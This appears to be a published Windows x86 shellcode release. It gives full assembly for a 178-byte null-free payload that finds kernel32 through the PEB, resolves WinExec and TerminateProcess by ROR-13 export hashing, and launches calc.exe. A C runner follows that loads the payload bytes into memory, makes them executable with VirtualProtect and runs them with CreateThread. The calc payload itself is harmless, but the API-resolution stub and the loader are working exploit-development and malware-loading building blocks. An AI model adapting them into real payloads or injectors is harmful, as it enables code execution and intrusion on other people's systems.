; Windows/x86 - WinExec PopCalc PEB & Export Directory Table NullFree Dynamic Shellcode (178 bytes)

; Description:

; This is a shellcode that pop a calc.exe. The shellcode iuses
; the PEB method to locate the baseAddress of the required module and the Export Directory Table
; to locate symbols. Also the shellcode uses a hash function to gather dynamically the required
; symbols without worry about the length. Finally the shellcode pop the calc.exe using WinExec
; and exits gracefully using TerminateProcess.

; Author: h4pp1n3ss
; Date: Wed 09/22/2021
; Tested on: Microsoft Windows [Version 10.0.19042.1237]

start:

   mov   ebp, esp                  ;     prologue
   add   esp, 0xfffff9f0           ;     Add space int ESP to avoid clobbering


 find_kernel32:
   xor   ecx, ecx                  ;     ECX = 0
   mov   esi,fs:[ecx+0x30]         ;     ESI = &(PEB) ([FS:0x30])
   mov   esi,[esi+0x0C]            ;     ESI = PEB->Ldr
   mov   esi,[esi+0x1C]            ;     ESI = PEB->Ldr.InInitOrder

 next_module:
   mov   ebx, [esi+0x08]           ;     EBX = InInitOrder[X].base_address
   mov   edi, [esi+0x20]           ;     EDI = InInitOrder[X].module_name
   mov   esi, [esi]                ;     ESI = InInitOrder[X].flink (next)
   cmp   [edi+12*2], cx            ;    (unicode) modulename[12] == 0x00 ?
   jne   next_module               ;     No: try next module

 find_function_shorten:
   jmp find_function_shorten_bnc   ;     Short jump

 find_function_ret:
   pop esi                         ;     POP the return address from the stack
   mov   [ebp+0x04], esi           ;     Save find_function address for later usage
   jmp resolve_symbols_kernel32    ;

 find_function_shorten_bnc:
   call find_function_ret          ;     Relative CALL with negative offset

 find_function:
   pushad                          ;     Save all registers

   mov   eax, [ebx+0x3c]           ;     Offset to PE Signature
   mov   edi, [ebx+eax+0x78]       ;     Export Table Directory RVA
   add   edi, ebx                  ;     Export Table Directory VMA
   mov   ecx, [edi+0x18]           ;     NumberOfNames
   mov   eax, [edi+0x20]           ;     AddressOfNames RVA
   add   eax, ebx                  ;     AddressOfNames VMA
   mov   [ebp-4], eax              ;     Save AddressOfNames VMA for later

 find_function_loop:
   jecxz find_function_finished    ;     Jump to the end if ECX is 0
   dec   ecx                       ;     Decrement our names counter
   mov   eax, [ebp-4]              ;     Restore AddressOfNames VMA
   mov   esi, [eax+ecx*4]          ;     Get the RVA of the symbol name
   add   esi, ebx                  ;     Set ESI to the VMA of the current symbol name

 compute_hash:
   xor   eax, eax                  ;     NULL EAX
   cdq                             ;     NULL EDX
   cld                             ;     Clear direction

 compute_hash_again:
   lodsb                           ;     Load the next byte from esi into al
   test  al, al                    ;     Check for NULL terminator
   jz    compute_hash_finished     ;     If the ZF is set, we've hit the NULL term
   ror   edx, 0x0d                 ;     Rotate edx 13 bits to the right
   add   edx, eax                  ;     Add the new byte to the accumulator
   jmp   compute_hash_again        ;     Next iteration

 compute_hash_finished:

 find_function_compare:
   cmp   edx, [esp+0x24]           ;     Compare the computed hash with the requested hash
   jnz   find_function_loop        ;     If it doesn't match go back to find_function_loop
   mov   edx, [edi+0x24]           ;     AddressOfNameOrdinals RVA
   add   edx, ebx                  ;     AddressOfNameOrdinals VMA
   mov   cx,  [edx+2*ecx]          ;     Extrapolate the function's ordinal
   mov   edx, [edi+0x1c]           ;     AddressOfFunctions RVA
   add   edx, ebx                  ;     AddressOfFunctions VMA
   mov   eax, [edx+4*ecx]          ;     Get the function RVA
   add   eax, ebx                  ;     Get the function VMA
   mov   [esp+0x1c], eax           ;     Overwrite stack version of eax from pushad

 find_function_finished:
   popad                           ;     Restore registers
   ret                             ;

 resolve_symbols_kernel32:
  push 0xe8afe98                  ;     WinExec hash
  call dword ptr [ebp+0x04]       ;     Call find_function
  mov   [ebp+0x10], eax           ;     Save WinExec address for later usage
  push 0x78b5b983                 ;     TerminateProcess hash
  call dword ptr [ebp+0x04]       ;     Call find_function
  mov   [ebp+0x14], eax           ;     Save TerminateProcess address for later usage

 create_calc_string:
  xor eax, eax                   ;      EAX = null
  push eax                       ;      Push null-terminated string
  push dword 0x6578652e		       ;
  push dword 0x636c6163          ;
  push esp                       ;      ESP = &(lpCmdLine)
  pop  ebx                       ;      EBX save pointer to string

 ; UINT WinExec(
 ; LPCSTR lpCmdLine, -> EBX
 ; UINT   uCmdShow 	 -> EAX
 ; );

 call_winexec:
	xor eax, eax                   ;    EAX = null
	push eax                       ;    uCmdShow
	push ebx                       ;    lpCmdLine
	call dword ptr [ebp+0x10]      ;    Call WinExec

 ; BOOL TerminateProcess(
 ; HANDLE hProcess,	 -> 0xffffffff
 ; UINT   uExitCode	 -> EAX
 ; );

 terminate_process:
	xor eax, eax                   ;    EAX = null
	push eax                       ;    uExitCode
	push 0xffffffff                ;    hProcess
	call dword ptr [ebp+0x14]      ;    Call TerminateProcess


[!]===================================== POC ========================================= [!]

/*

 Shellcode runner author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Our WinExec PopCalc shellcode

unsigned char payload[] =
"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e"
"\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43"
"\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b"
"\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
"\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61"
"\xc3\x68\x98\xfe\x8a\x0e\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x14\x31\xc0"
"\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x5b\x31\xc0\x50\x53\xff\x55\x10\x31\xc0\x50\x6a\xff"
"\xff\x55\x14";


unsigned int payload_len = 178;

int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
  printf("Shellcode Length:  %d\n", strlen(payload));
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}